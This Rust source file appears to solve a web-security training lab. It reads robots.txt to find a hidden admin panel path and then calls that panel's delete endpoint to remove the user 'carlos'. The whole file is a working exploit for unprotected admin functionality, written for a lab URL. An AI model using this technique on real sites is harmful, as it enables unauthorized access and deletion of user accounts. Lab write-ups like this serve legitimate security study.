/*******************************************************
*
* Lab: Unprotected admin functionality
*
* Hack Steps: 
*      1. Fetch the /robots.txt file
*      2. Extract the admin panel hidden path
*      3. Delete carlos from the admin panel
*
********************************************************/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a84000d0418173f81c5447400760018.web-security-academy.net";

fn main() {
    print!("⦗1⦘ Fetching the robots.txt file.. ");
    flush_terminal();

    let robots_txt = fetch("/robots.txt");

    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting the hidden path.. ");
    flush_terminal();

    let file_content = robots_txt.text().unwrap();
    let hidden_path = capture_pattern_from_text("Disallow: (.*)", &file_content);

    println!("{} => {}", "OK".green(), hidden_path.yellow());
    print!("⦗3⦘ Deleting carlos from the admin panel.. ");
    flush_terminal();

    fetch(&format!("{hidden_path}/delete?username=carlos"));

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn fetch(path: &str) -> Response {
    let client = build_web_client();
    client
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
